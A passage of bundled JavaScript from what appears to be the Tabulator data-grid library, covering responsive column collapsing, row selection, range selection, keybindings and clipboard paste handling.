      column.modules.responsive.visible = column.visible;
      this.initializeResponsivity();
    }
  }
  hideColumn(column) {
    var colCount = this.hiddenColumns.length;
    column.hide(false, true);
    if (this.mode === "collapse") {
      this.hiddenColumns.unshift(column);
      this.generateCollapsedContent();
      if (this.collapseHandleColumn && !colCount) {
        this.collapseHandleColumn.show();
      }
    }
  }
  showColumn(column) {
    var index;
    column.show(false, true);
    column.setWidth(column.getWidth());
    if (this.mode === "collapse") {
      index = this.hiddenColumns.indexOf(column);
      if (index > -1) {
        this.hiddenColumns.splice(index, 1);
      }
      this.generateCollapsedContent();
      if (this.collapseHandleColumn && !this.hiddenColumns.length) {
        this.collapseHandleColumn.hide();
      }
    }
  }
  //redraw columns to fit space
  update() {
    var working = true;
    while (working) {
      let width = this.table.modules.layout.getMode() == "fitColumns" ? this.table.columnManager.getFlexBaseWidth() : this.table.columnManager.getWidth();
      let diff2 = (this.table.options.headerVisible ? this.table.columnManager.element.clientWidth : this.table.element.clientWidth) - width;
      if (diff2 < 0) {
        let column = this.columns[this.index];
        if (column) {
          this.hideColumn(column);
          this.index++;
        } else {
          working = false;
        }
      } else {
        let column = this.columns[this.index - 1];
        if (column) {
          if (diff2 > 0) {
            if (diff2 >= column.getWidth()) {
              this.showColumn(column);
              this.index--;
            } else {
              working = false;
            }
          } else {
            working = false;
          }
        } else {
          working = false;
        }
      }
      if (!this.table.rowManager.activeRowsCount) {
        this.table.rowManager.renderEmptyScroll();
      }
    }
  }
  generateCollapsedContent() {
    var rows2 = this.table.rowManager.getDisplayRows();
    rows2.forEach((row) => {
      this.generateCollapsedRowContent(row);
    });
  }
  generateCollapsedRowContent(row) {
    var el, contents;
    if (row.modules.responsiveLayout) {
      el = row.modules.responsiveLayout.element;
      while (el.firstChild) el.removeChild(el.firstChild);
      contents = this.collapseFormatter(this.generateCollapsedRowData(row));
      if (contents) {
        el.appendChild(contents);
      }
      row.calcHeight(true);
    }
  }
  generateCollapsedRowData(row) {
    var data = row.getData(), output = [], mockCellComponent;
    this.hiddenColumns.forEach((column) => {
      var value = column.getFieldValue(data);
      if (column.definition.title && column.field) {
        if (column.modules.format && this.table.options.responsiveLayoutCollapseUseFormatters) {
          let onRendered = function(callback) {
            callback();
          };
          mockCellComponent = {
            value: false,
            data: {},
            getValue: function() {
              return value;
            },
            getData: function() {
              return data;
            },
            getType: function() {
              return "cell";
            },
            getElement: function() {
              return document.createElement("div");
            },
            getRow: function() {
              return row.getComponent();
            },
            getColumn: function() {
              return column.getComponent();
            },
            getTable: () => {
              return this.table;
            }
          };
          output.push({
            field: column.field,
            title: column.definition.title,
            value: column.modules.format.formatter.call(this.table.modules.format, mockCellComponent, column.modules.format.params, onRendered)
          });
        } else {
          output.push({
            field: column.field,
            title: column.definition.title,
            value
          });
        }
      }
    });
    return output;
  }
  formatCollapsedData(data) {
    var list2 = document.createElement("table");
    data.forEach((item) => {
      var row = document.createElement("tr");
      var titleData = document.createElement("td");
      var valueData = document.createElement("td");
      var node_content;
      var titleHighlight = document.createElement("strong");
      titleData.appendChild(titleHighlight);
      this.modules.localize.bind("columns|" + item.field, function(text) {
        titleHighlight.innerHTML = text || item.title;
      });
      if (item.value instanceof Node) {
        node_content = document.createElement("div");
        node_content.appendChild(item.value);
        valueData.appendChild(node_content);
      } else {
        valueData.innerHTML = item.value;
      }
      row.appendChild(titleData);
      row.appendChild(valueData);
      list2.appendChild(row);
    });
    return Object.keys(data).length ? list2 : "";
  }
}
function rowSelection(cell, formatterParams, onRendered) {
  var checkbox = document.createElement("input");
  var blocked = false;
  checkbox.type = "checkbox";
  checkbox.setAttribute("aria-label", "Select Row");
  if (this.table.modExists("selectRow", true)) {
    checkbox.addEventListener("click", (e2) => {
      e2.stopPropagation();
    });
    if (typeof cell.getRow == "function") {
      var row = cell.getRow();
      if (row instanceof RowComponent) {
        checkbox.addEventListener("change", (e2) => {
          if (this.table.options.selectableRowsRangeMode === "click") {
            if (!blocked) {
              row.toggleSelect();
            } else {
              blocked = false;
            }
          } else {
            row.toggleSelect();
          }
        });
        if (this.table.options.selectableRowsRangeMode === "click") {
          checkbox.addEventListener("click", (e2) => {
            blocked = true;
            this.table.modules.selectRow.handleComplexRowClick(row._row, e2);
          });
        }
        checkbox.checked = row.isSelected && row.isSelected();
        this.table.modules.selectRow.registerRowSelectCheckbox(row, checkbox);
      } else {
        checkbox = "";
      }
    } else {
      checkbox.addEventListener("change", (e2) => {
        if (this.table.modules.selectRow.selectedRows.length) {
          this.table.deselectRow();
        } else {
          this.table.selectRow(formatterParams.rowRange);
        }
      });
      this.table.modules.selectRow.registerHeaderSelectCheckbox(checkbox);
    }
  }
  return checkbox;
}
var extensions$1 = {
  format: {
    formatters: {
      rowSelection
    }
  }
};
class SelectRow extends Module {
  static moduleName = "selectRow";
  static moduleExtensions = extensions$1;
  constructor(table) {
    super(table);
    this.selecting = false;
    this.lastClickedRow = false;
    this.selectPrev = [];
    this.selectedRows = [];
    this.headerCheckboxElement = null;
    this.registerTableOption("selectableRows", "highlight");
    this.registerTableOption("selectableRowsRangeMode", "drag");
    this.registerTableOption("selectableRowsRollingSelection", true);
    this.registerTableOption("selectableRowsPersistence", true);
    this.registerTableOption("selectableRowsCheck", function(data, row) {
      return true;
    });
    this.registerTableFunction("selectRow", this.selectRows.bind(this));
    this.registerTableFunction("deselectRow", this.deselectRows.bind(this));
    this.registerTableFunction("toggleSelectRow", this.toggleRow.bind(this));
    this.registerTableFunction("getSelectedRows", this.getSelectedRows.bind(this));
    this.registerTableFunction("getSelectedData", this.getSelectedData.bind(this));
    this.registerComponentFunction("row", "select", this.selectRows.bind(this));
    this.registerComponentFunction("row", "deselect", this.deselectRows.bind(this));
    this.registerComponentFunction("row", "toggleSelect", this.toggleRow.bind(this));
    this.registerComponentFunction("row", "isSelected", this.isRowSelected.bind(this));
  }
  initialize() {
    this.deprecatedOptionsCheck();
    if (this.table.options.selectableRows === "highlight" && this.table.options.selectableRange) {
      this.table.options.selectableRows = false;
    }
    if (this.table.options.selectableRows !== false) {
      this.subscribe("row-init", this.initializeRow.bind(this));
      this.subscribe("row-deleting", this.rowDeleted.bind(this));
      this.subscribe("rows-wipe", this.clearSelectionData.bind(this));
      this.subscribe("rows-retrieve", this.rowRetrieve.bind(this));
      if (this.table.options.selectableRows && !this.table.options.selectableRowsPersistence) {
        this.subscribe("data-refreshing", this.deselectRows.bind(this));
      }
    }
  }
  deprecatedOptionsCheck() {
  }
  rowRetrieve(type, prevValue) {
    return type === "selected" ? this.selectedRows : prevValue;
  }
  rowDeleted(row) {
    this._deselectRow(row, true);
  }
  clearSelectionData(silent) {
    var prevSelected = this.selectedRows.length;
    this.selecting = false;
    this.lastClickedRow = false;
    this.selectPrev = [];
    this.selectedRows = [];
    if (prevSelected && silent !== true) {
      this._rowSelectionChanged();
    }
  }
  initializeRow(row) {
    var self = this, selectable = self.checkRowSelectability(row), element = row.getElement();
    var endSelect = function() {
      setTimeout(function() {
        self.selecting = false;
      }, 50);
      document.body.removeEventListener("mouseup", endSelect);
    };
    row.modules.select = { selected: false };
    element.classList.toggle("tabulator-selectable", selectable);
    element.classList.toggle("tabulator-unselectable", !selectable);
    if (self.checkRowSelectability(row)) {
      if (self.table.options.selectableRows && self.table.options.selectableRows != "highlight") {
        if (self.table.options.selectableRowsRangeMode === "click") {
          element.addEventListener("click", this.handleComplexRowClick.bind(this, row));
        } else {
          element.addEventListener("click", function(e2) {
            if (!self.table.modExists("edit") || !self.table.modules.edit.getCurrentCell()) {
              self.table._clearSelection();
            }
            if (!self.selecting) {
              self.toggleRow(row);
            }
          });
          element.addEventListener("mousedown", function(e2) {
            if (e2.shiftKey) {
              self.table._clearSelection();
              self.selecting = true;
              self.selectPrev = [];
              document.body.addEventListener("mouseup", endSelect);
              document.body.addEventListener("keyup", endSelect);
              self.toggleRow(row);
              return false;
            }
          });
          element.addEventListener("mouseenter", function(e2) {
            if (self.selecting) {
              self.table._clearSelection();
              self.toggleRow(row);
              if (self.selectPrev[1] == row) {
                self.toggleRow(self.selectPrev[0]);
              }
            }
          });
          element.addEventListener("mouseout", function(e2) {
            if (self.selecting) {
              self.table._clearSelection();
              self.selectPrev.unshift(row);
            }
          });
        }
      }
    }
  }
  handleComplexRowClick(row, e2) {
    if (e2.shiftKey) {
      this.table._clearSelection();
      this.lastClickedRow = this.lastClickedRow || row;
      var lastClickedRowIdx = this.table.rowManager.getDisplayRowIndex(this.lastClickedRow);
      var rowIdx = this.table.rowManager.getDisplayRowIndex(row);
      var fromRowIdx = lastClickedRowIdx <= rowIdx ? lastClickedRowIdx : rowIdx;
      var toRowIdx = lastClickedRowIdx >= rowIdx ? lastClickedRowIdx : rowIdx;
      var rows2 = this.table.rowManager.getDisplayRows().slice(0);
      var toggledRows = rows2.splice(fromRowIdx, toRowIdx - fromRowIdx + 1);
      if (e2.ctrlKey || e2.metaKey) {
        toggledRows.forEach((toggledRow) => {
          if (toggledRow !== this.lastClickedRow) {
            if (this.table.options.selectableRows !== true && !this.isRowSelected(row)) {
              if (this.selectedRows.length < this.table.options.selectableRows) {
                this.toggleRow(toggledRow);
              }
            } else {
              this.toggleRow(toggledRow);
            }
          }
        });
        this.lastClickedRow = row;
      } else {
        this.deselectRows(void 0, true);
        if (this.table.options.selectableRows !== true) {
          if (toggledRows.length > this.table.options.selectableRows) {
            toggledRows = toggledRows.slice(0, this.table.options.selectableRows);
          }
        }
        this.selectRows(toggledRows);
      }
      this.table._clearSelection();
    } else if (e2.ctrlKey || e2.metaKey) {
      this.toggleRow(row);
      this.lastClickedRow = row;
    } else {
      this.deselectRows(void 0, true);
      this.selectRows(row);
      this.lastClickedRow = row;
    }
  }
  checkRowSelectability(row) {
    if (row && row.type === "row") {
      return this.table.options.selectableRowsCheck.call(this.table, row.getComponent());
    }
    return false;
  }
  //toggle row selection
  toggleRow(row) {
    if (this.checkRowSelectability(row)) {
      if (row.modules.select && row.modules.select.selected) {
        this._deselectRow(row);
      } else {
        this._selectRow(row);
      }
    }
  }
  //select a number of rows
  selectRows(rows2) {
    var changes = [], rowMatch, change;
    switch (typeof rows2) {
      case "undefined":
        rowMatch = this.table.rowManager.rows;
        break;
      case "number":
        rowMatch = this.table.rowManager.findRow(rows2);
        break;
      case "string":
        rowMatch = this.table.rowManager.findRow(rows2);
        if (!rowMatch) {
          rowMatch = this.table.rowManager.getRows(rows2);
        }
        break;
      default:
        rowMatch = rows2;
        break;
    }
    if (Array.isArray(rowMatch)) {
      if (rowMatch.length) {
        rowMatch.forEach((row) => {
          change = this._selectRow(row, true, true);
          if (change) {
            changes.push(change);
          }
        });
        this._rowSelectionChanged(false, changes);
      }
    } else {
      if (rowMatch) {
        this._selectRow(rowMatch, false, true);
      }
    }
  }
  //select an individual row
  _selectRow(rowInfo, silent, force) {
    if (!isNaN(this.table.options.selectableRows) && this.table.options.selectableRows !== true && !force) {
      if (this.selectedRows.length >= this.table.options.selectableRows) {
        if (this.table.options.selectableRowsRollingSelection) {
          this._deselectRow(this.selectedRows[0]);
        } else {
          return false;
        }
      }
    }
    var row = this.table.rowManager.findRow(rowInfo);
    if (row) {
      if (this.selectedRows.indexOf(row) == -1) {
        row.getElement().classList.add("tabulator-selected");
        if (!row.modules.select) {
          row.modules.select = {};
        }
        row.modules.select.selected = true;
        if (row.modules.select.checkboxEl) {
          row.modules.select.checkboxEl.checked = true;
        }
        this.selectedRows.push(row);
        if (this.table.options.dataTreeSelectPropagate) {
          this.childRowSelection(row, true);
        }
        this.dispatchExternal("rowSelected", row.getComponent());
        this._rowSelectionChanged(silent, row);
        return row;
      }
    } else {
      if (!silent) {
        console.warn("Selection Error - No such row found, ignoring selection:" + rowInfo);
      }
    }
  }
  isRowSelected(row) {
    return this.selectedRows.indexOf(row) !== -1;
  }
  //deselect a number of rows
  deselectRows(rows2, silent) {
    var changes = [], rowMatch, change;
    switch (typeof rows2) {
      case "undefined":
        rowMatch = Object.assign([], this.selectedRows);
        break;
      case "number":
        rowMatch = this.table.rowManager.findRow(rows2);
        break;
      case "string":
        rowMatch = this.table.rowManager.findRow(rows2);
        if (!rowMatch) {
          rowMatch = this.table.rowManager.getRows(rows2);
        }
        break;
      default:
        rowMatch = rows2;
        break;
    }
    if (Array.isArray(rowMatch)) {
      if (rowMatch.length) {
        rowMatch.forEach((row) => {
          change = this._deselectRow(row, true, true);
          if (change) {
            changes.push(change);
          }
        });
        this._rowSelectionChanged(silent, [], changes);
      }
    } else {
      if (rowMatch) {
        this._deselectRow(rowMatch, silent, true);
      }
    }
  }
  //deselect an individual row
  _deselectRow(rowInfo, silent) {
    var self = this, row = self.table.rowManager.findRow(rowInfo), index, element;
    if (row) {
      index = self.selectedRows.findIndex(function(selectedRow) {
        return selectedRow == row;
      });
      if (index > -1) {
        element = row.getElement();
        if (element) {
          element.classList.remove("tabulator-selected");
        }
        if (!row.modules.select) {
          row.modules.select = {};
        }
        row.modules.select.selected = false;
        if (row.modules.select.checkboxEl) {
          row.modules.select.checkboxEl.checked = false;
        }
        self.selectedRows.splice(index, 1);
        if (this.table.options.dataTreeSelectPropagate) {
          this.childRowSelection(row, false);
        }
        this.dispatchExternal("rowDeselected", row.getComponent());
        self._rowSelectionChanged(silent, void 0, row);
        return row;
      }
    } else {
      if (!silent) {
        console.warn("Deselection Error - No such row found, ignoring selection:" + rowInfo);
      }
    }
  }
  getSelectedData() {
    var data = [];
    this.selectedRows.forEach(function(row) {
      data.push(row.getData());
    });
    return data;
  }
  getSelectedRows() {
    var rows2 = [];
    this.selectedRows.forEach(function(row) {
      rows2.push(row.getComponent());
    });
    return rows2;
  }
  _rowSelectionChanged(silent, selected = [], deselected = []) {
    if (this.headerCheckboxElement) {
      if (this.selectedRows.length === 0) {
        this.headerCheckboxElement.checked = false;
        this.headerCheckboxElement.indeterminate = false;
      } else if (this.table.rowManager.rows.length === this.selectedRows.length) {
        this.headerCheckboxElement.checked = true;
        this.headerCheckboxElement.indeterminate = false;
      } else {
        this.headerCheckboxElement.indeterminate = true;
        this.headerCheckboxElement.checked = false;
      }
    }
    if (!silent) {
      if (!Array.isArray(selected)) {
        selected = [selected];
      }
      selected = selected.map((row) => row.getComponent());
      if (!Array.isArray(deselected)) {
        deselected = [deselected];
      }
      deselected = deselected.map((row) => row.getComponent());
      this.dispatchExternal("rowSelectionChanged", this.getSelectedData(), this.getSelectedRows(), selected, deselected);
    }
  }
  registerRowSelectCheckbox(row, element) {
    if (!row._row.modules.select) {
      row._row.modules.select = {};
    }
    row._row.modules.select.checkboxEl = element;
  }
  registerHeaderSelectCheckbox(element) {
    this.headerCheckboxElement = element;
  }
  childRowSelection(row, select) {
    var children = this.table.modules.dataTree.getChildren(row, true, true);
    if (select) {
      for (let child of children) {
        this._selectRow(child, true);
      }
    } else {
      for (let child of children) {
        this._deselectRow(child, true);
      }
    }
  }
}
class RangeComponent {
  constructor(range2) {
    this._range = range2;
    return new Proxy(this, {
      get: function(target, name, receiver) {
        if (typeof target[name] !== "undefined") {
          return target[name];
        } else {
          return target._range.table.componentFunctionBinder.handle("range", target._range, name);
        }
      }
    });
  }
  getElement() {
    return this._range.element;
  }
  getData() {
    return this._range.getData();
  }
  getCells() {
    return this._range.getCells(true, true);
  }
  getStructuredCells() {
    return this._range.getStructuredCells();
  }
  getRows() {
    return this._range.getRows().map((row) => row.getComponent());
  }
  getColumns() {
    return this._range.getColumns().map((column) => column.getComponent());
  }
  getBounds() {
    return this._range.getBounds();
  }
  getTopEdge() {
    return this._range.top;
  }
  getBottomEdge() {
    return this._range.bottom;
  }
  getLeftEdge() {
    return this._range.left;
  }
  getRightEdge() {
    return this._range.right;
  }
  setBounds(start2, end2) {
    if (this._range.destroyedGuard("setBounds")) {
      this._range.setBounds(start2 ? start2._cell : start2, end2 ? end2._cell : end2);
    }
  }
  setStartBound(start2) {
    if (this._range.destroyedGuard("setStartBound")) {
      this._range.setEndBound(start2 ? start2._cell : start2);
      this._range.rangeManager.layoutElement();
    }
  }
  setEndBound(end2) {
    if (this._range.destroyedGuard("setEndBound")) {
      this._range.setEndBound(end2 ? end2._cell : end2);
      this._range.rangeManager.layoutElement();
    }
  }
  clearValues() {
    if (this._range.destroyedGuard("clearValues")) {
      this._range.clearValues();
    }
  }
  remove() {
    if (this._range.destroyedGuard("remove")) {
      this._range.destroy(true);
    }
  }
}
class Range extends CoreFeature {
  constructor(table, rangeManager, start2, end2) {
    super(table);
    this.rangeManager = rangeManager;
    this.element = null;
    this.initialized = false;
    this.initializing = {
      start: false,
      end: false
    };
    this.destroyed = false;
    this.top = 0;
    this.bottom = 0;
    this.left = 0;
    this.right = 0;
    this.table = table;
    this.start = { row: 0, col: 0 };
    this.end = { row: 0, col: 0 };
    if (this.rangeManager.rowHeader) {
      this.left = 1;
      this.right = 1;
      this.start.col = 1;
      this.end.col = 1;
    }
    this.initElement();
    setTimeout(() => {
      this.initBounds(start2, end2);
    });
  }
  initElement() {
    this.element = document.createElement("div");
    this.element.classList.add("tabulator-range");
  }
  initBounds(start2, end2) {
    this._updateMinMax();
    if (start2) {
      this.setBounds(start2, end2 || start2);
    }
  }
  ///////////////////////////////////
  ///////   Boundary Setup    ///////
  ///////////////////////////////////
  setStart(row, col) {
    if (this.start.row !== row || this.start.col !== col) {
      this.start.row = row;
      this.start.col = col;
      this.initializing.start = true;
      this._updateMinMax();
    }
  }
  setEnd(row, col) {
    if (this.end.row !== row || this.end.col !== col) {
      this.end.row = row;
      this.end.col = col;
      this.initializing.end = true;
      this._updateMinMax();
    }
  }
  setBounds(start2, end2, visibleRows) {
    if (start2) {
      this.setStartBound(start2);
    }
    this.setEndBound(end2 || start2);
    this.rangeManager.layoutElement(visibleRows);
  }
  setStartBound(element) {
    var row, col;
    if (element.type === "column") {
      if (this.rangeManager.columnSelection) {
        this.setStart(0, element.getPosition() - 1);
      }
    } else {
      row = element.row.position - 1;
      col = element.column.getPosition() - 1;
      if (element.column === this.rangeManager.rowHeader) {
        this.setStart(row, 1);
      } else {
        this.setStart(row, col);
      }
    }
  }
  setEndBound(element) {
    var rowsCount = this._getTableRows().length, row, col, isRowHeader;
    if (element.type === "column") {
      if (this.rangeManager.columnSelection) {
        if (this.rangeManager.selecting === "column") {
          this.setEnd(rowsCount - 1, element.getPosition() - 1);
        } else if (this.rangeManager.selecting === "cell") {
          this.setEnd(0, element.getPosition() - 1);
        }
      }
    } else {
      row = element.row.position - 1;
      col = element.column.getPosition() - 1;
      isRowHeader = element.column === this.rangeManager.rowHeader;
      if (this.rangeManager.selecting === "row") {
        this.setEnd(row, this._getTableColumns().length - 1);
      } else if (this.rangeManager.selecting !== "row" && isRowHeader) {
        this.setEnd(row, 0);
      } else if (this.rangeManager.selecting === "column") {
        this.setEnd(rowsCount - 1, col);
      } else {
        this.setEnd(row, col);
      }
    }
  }
  _updateMinMax() {
    this.top = Math.min(this.start.row, this.end.row);
    this.bottom = Math.max(this.start.row, this.end.row);
    this.left = Math.min(this.start.col, this.end.col);
    this.right = Math.max(this.start.col, this.end.col);
    if (this.initialized) {
      this.dispatchExternal("rangeChanged", this.getComponent());
    } else {
      if (this.initializing.start && this.initializing.end) {
        this.initialized = true;
        this.dispatchExternal("rangeAdded", this.getComponent());
      }
    }
  }
  _getTableColumns() {
    return this.table.columnManager.getVisibleColumnsByIndex();
  }
  _getTableRows() {
    return this.table.rowManager.getDisplayRows().filter((row) => row.type === "row");
  }
  ///////////////////////////////////
  ///////      Rendering      ///////
  ///////////////////////////////////
  layout() {
    var _vDomTop = this.table.rowManager.renderer.vDomTop, _vDomBottom = this.table.rowManager.renderer.vDomBottom, _vDomLeft = this.table.columnManager.renderer.leftCol, _vDomRight = this.table.columnManager.renderer.rightCol, top2, bottom2, left2, right2, topLeftCell, bottomRightCell, topLeftCellEl, bottomRightCellEl, topLeftRowEl, bottomRightRowEl;
    if (this.table.options.renderHorizontal === "virtual" && this.rangeManager.rowHeader) {
      _vDomRight += 1;
    }
    if (_vDomTop == null) {
      _vDomTop = 0;
    }
    if (_vDomBottom == null) {
      _vDomBottom = Infinity;
    }
    if (_vDomLeft == null) {
      _vDomLeft = 0;
    }
    if (_vDomRight == null) {
      _vDomRight = Infinity;
    }
    if (this.overlaps(_vDomLeft, _vDomTop, _vDomRight, _vDomBottom)) {
      top2 = Math.max(this.top, _vDomTop);
      bottom2 = Math.min(this.bottom, _vDomBottom);
      left2 = Math.max(this.left, _vDomLeft);
      right2 = Math.min(this.right, _vDomRight);
      topLeftCell = this.rangeManager.getCell(top2, left2);
      bottomRightCell = this.rangeManager.getCell(bottom2, right2);
      topLeftCellEl = topLeftCell.getElement();
      bottomRightCellEl = bottomRightCell.getElement();
      topLeftRowEl = topLeftCell.row.getElement();
      bottomRightRowEl = bottomRightCell.row.getElement();
      this.element.classList.add("tabulator-range-active");
      if (this.table.rtl) {
        this.element.style.right = topLeftRowEl.offsetWidth - topLeftCellEl.offsetLeft - topLeftCellEl.offsetWidth + "px";
        this.element.style.width = topLeftCellEl.offsetLeft + topLeftCellEl.offsetWidth - bottomRightCellEl.offsetLeft + "px";
      } else {
        this.element.style.left = topLeftRowEl.offsetLeft + topLeftCellEl.offsetLeft + "px";
        this.element.style.width = bottomRightCellEl.offsetLeft + bottomRightCellEl.offsetWidth - topLeftCellEl.offsetLeft + "px";
      }
      this.element.style.top = topLeftRowEl.offsetTop + "px";
      this.element.style.height = bottomRightRowEl.offsetTop + bottomRightRowEl.offsetHeight - topLeftRowEl.offsetTop + "px";
    }
  }
  atTopLeft(cell) {
    return cell.row.position - 1 === this.top && cell.column.getPosition() - 1 === this.left;
  }
  atBottomRight(cell) {
    return cell.row.position - 1 === this.bottom && cell.column.getPosition() - 1 === this.right;
  }
  occupies(cell) {
    return this.occupiesRow(cell.row) && this.occupiesColumn(cell.column);
  }
  occupiesRow(row) {
    return this.top <= row.position - 1 && row.position - 1 <= this.bottom;
  }
  occupiesColumn(col) {
    return this.left <= col.getPosition() - 1 && col.getPosition() - 1 <= this.right;
  }
  overlaps(left2, top2, right2, bottom2) {
    if (this.left > right2 || left2 > this.right || (this.top > bottom2 || top2 > this.bottom)) {
      return false;
    }
    return true;
  }
  getData() {
    var data = [], rows2 = this.getRows(), columns = this.getColumns();
    rows2.forEach((row) => {
      var rowData = row.getData(), result = {};
      columns.forEach((column) => {
        result[column.field] = rowData[column.field];
      });
      data.push(result);
    });
    return data;
  }
  getCells(structured, component) {
    var cells = [], rows2 = this.getRows(), columns = this.getColumns();
    if (structured) {
      cells = rows2.map((row) => {
        var arr = [];
        row.getCells().forEach((cell) => {
          if (columns.includes(cell.column)) {
            arr.push(component ? cell.getComponent() : cell);
          }
        });
        return arr;
      });
    } else {
      rows2.forEach((row) => {
        row.getCells().forEach((cell) => {
          if (columns.includes(cell.column)) {
            cells.push(component ? cell.getComponent() : cell);
          }
        });
      });
    }
    return cells;
  }
  getStructuredCells() {
    return this.getCells(true, true);
  }
  getRows() {
    return this._getTableRows().slice(this.top, this.bottom + 1);
  }
  getColumns() {
    return this._getTableColumns().slice(this.left, this.right + 1);
  }
  clearValues() {
    var cells = this.getCells();
    var clearValue = this.table.options.selectableRangeClearCellsValue;
    this.table.blockRedraw();
    cells.forEach((cell) => {
      cell.setValue(clearValue);
    });
    this.table.restoreRedraw();
  }
  getBounds(component) {
    var cells = this.getCells(false, component), output = {
      start: null,
      end: null
    };
    if (cells.length) {
      output.start = cells[0];
      output.end = cells[cells.length - 1];
    } else {
      console.warn("No bounds defined on range");
    }
    return output;
  }
  getComponent() {
    if (!this.component) {
      this.component = new RangeComponent(this);
    }
    return this.component;
  }
  destroy(notify) {
    this.destroyed = true;
    this.element.remove();
    if (notify) {
      this.rangeManager.rangeRemoved(this);
    }
    if (this.initialized) {
      this.dispatchExternal("rangeRemoved", this.getComponent());
    }
  }
  destroyedGuard(func) {
    if (this.destroyed) {
      console.warn("You cannot call the " + func + " function on a destroyed range");
    }
    return !this.destroyed;
  }
}
var bindings = {
  rangeJumpUp: ["ctrl + 38", "meta + 38"],
  rangeJumpDown: ["ctrl + 40", "meta + 40"],
  rangeJumpLeft: ["ctrl + 37", "meta + 37"],
  rangeJumpRight: ["ctrl + 39", "meta + 39"],
  rangeExpandUp: "shift + 38",
  rangeExpandDown: "shift + 40",
  rangeExpandLeft: "shift + 37",
  rangeExpandRight: "shift + 39",
  rangeExpandJumpUp: ["ctrl + shift + 38", "meta + shift + 38"],
  rangeExpandJumpDown: ["ctrl + shift + 40", "meta + shift + 40"],
  rangeExpandJumpLeft: ["ctrl + shift + 37", "meta + shift + 37"],
  rangeExpandJumpRight: ["ctrl + shift + 39", "meta + shift + 39"]
};
var actions = {
  rangeJumpLeft: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "left", true, false);
  },
  rangeJumpRight: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "right", true, false);
  },
  rangeJumpUp: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "up", true, false);
  },
  rangeJumpDown: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "down", true, false);
  },
  rangeExpandLeft: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "left", false, true);
  },
  rangeExpandRight: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "right", false, true);
  },
  rangeExpandUp: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "up", false, true);
  },
  rangeExpandDown: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "down", false, true);
  },
  rangeExpandJumpLeft: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "left", true, true);
  },
  rangeExpandJumpRight: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "right", true, true);
  },
  rangeExpandJumpUp: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "up", true, true);
  },
  rangeExpandJumpDown: function(e2) {
    this.dispatch("keybinding-nav-range", e2, "down", true, true);
  }
};
var pasteActions = {
  range: function(data) {
    var rows2 = [], range2 = this.table.modules.selectRange.activeRange, singleCell = false, bounds, startCell, startRow, rowWidth, dataLength;
    dataLength = data.length;
    if (range2) {
      bounds = range2.getBounds();
      startCell = bounds.start;
      if (bounds.start === bounds.end) {
        singleCell = true;
      }
      if (startCell) {
        rows2 = this.table.rowManager.activeRows.slice();
        startRow = rows2.indexOf(startCell.row);
        if (singleCell) {
          rowWidth = data.length;
        } else {
          rowWidth = rows2.indexOf(bounds.end.row) - startRow + 1;
        }
        if (startRow > -1) {
          this.table.blockRedraw();
          rows2 = rows2.slice(startRow, startRow + rowWidth);
          rows2.forEach((row, i2) => {
            row.updateData(data[i2 % dataLength]);
          });
          this.table.restoreRedraw();
        }
      }
    }
    return rows2;
  }
};
var pasteParsers = {
  range: function(clipboard) {
    var data = [], rows2 = [], range2 = this.table.modules.selectRange.activeRange, singleCell = false, bounds, startCell, colWidth, columnMap, startCol;
    if (range2) {
      bounds = range2.getBounds();
      startCell = bounds.start;
      if (bounds.start === bounds.end) {
        singleCell = true;
      }
      if (startCell) {
        clipboard = clipboard.split("\n");
        clipboard.forEach(function(row) {
          data.push(row.split("	"));
        });
        if (data.length) {
          columnMap = this.table.columnManager.getVisibleColumnsByIndex();
          startCol = columnMap.indexOf(startCell.column);
          if (startCol > -1) {
            if (singleCell) {
              colWidth = data[0].length;
            } else {
              colWidth = columnMap.indexOf(bounds.end.column) - startCol + 1;
            }
            columnMap = columnMap.slice(startCol, startCol + colWidth);
            data.forEach((item) => {
              var row = {};
              var itemLength = item.length;
              columnMap.forEach(function(col, i2) {
                row[col.field] = item[i2 % itemLength];
              });
              rows2.push(row);
            });
            return rows2;
          }
        }
      }
    }
    return false;
  }
};
var columnLookups = {
  range: function() {
    var columns = this.modules.selectRange.selectedColumns();
    if (this.columnManager.rowHeader) {
      columns.unshift(this.columnManager.rowHeader);
    }
    return columns;
  }
};
var rowLookups = {
  range: function() {
    return this.modules.selectRange.selectedRows();
  }
};
var extensions = {
  keybindings: {
    bindings,
    actions
  },
  clipboard: {
    pasteActions,
    pasteParsers
  },
  export: {
    columnLookups,
    rowLookups
  }
};
class SelectRange extends Module {
  static moduleName = "selectRange";
  static moduleInitOrder = 1;
  static moduleExtensions = extensions;
  constructor(table) {
    super(table);
    this.selecting = "cell";
    this.mousedown = false;
    this.ranges = [];
    this.overlay = null;
    this.rowHeader = null;
    this.layoutChangeTimeout = null;
    this.columnSelection = false;
    this.rowSelection = false;
    this.maxRanges = 0;
    this.activeRange = false;
    this.blockKeydown = false;
    this.keyDownEvent = this._handleKeyDown.bind(this);
    this.mouseUpEvent = this._handleMouseUp.bind(this);
    this.registerTableOption("selectableRange", false);
    this.registerTableOption("selectableRangeColumns", false);
    this.registerTableOption("selectableRangeRows", false);
    this.registerTableOption("selectableRangeClearCells", false);
    this.registerTableOption("selectableRangeClearCellsValue", void 0);
    this.registerTableOption("selectableRangeAutoFocus", true);
    this.registerTableFunction("getRangesData", this.getRangesData.bind(this));
    this.registerTableFunction("getRanges", this.getRanges.bind(this));
    this.registerTableFunction("addRange", this.addRangeFromComponent.bind(this));
    this.registerComponentFunction("cell", "getRanges", this.cellGetRanges.bind(this));
    this.registerComponentFunction("row", "getRanges", this.rowGetRanges.bind(this));
    this.registerComponentFunction("column", "getRanges", this.colGetRanges.bind(this));
  }
  ///////////////////////////////////
  ///////    Initialization   ///////
  ///////////////////////////////////
  initialize() {
    if (this.options("selectableRange")) {
      if (!this.options("selectableRows")) {
        this.maxRanges = this.options("selectableRange");
        this.initializeTable();
        this.initializeWatchers();
      } else {
        console.warn("SelectRange functionality cannot be used in conjunction with row selection");
      }
      if (this.options("columns").findIndex((column) => column.frozen) > 0) {
        console.warn("Having frozen column in arbitrary position with selectRange option may result in unpredictable behavior.");
      }
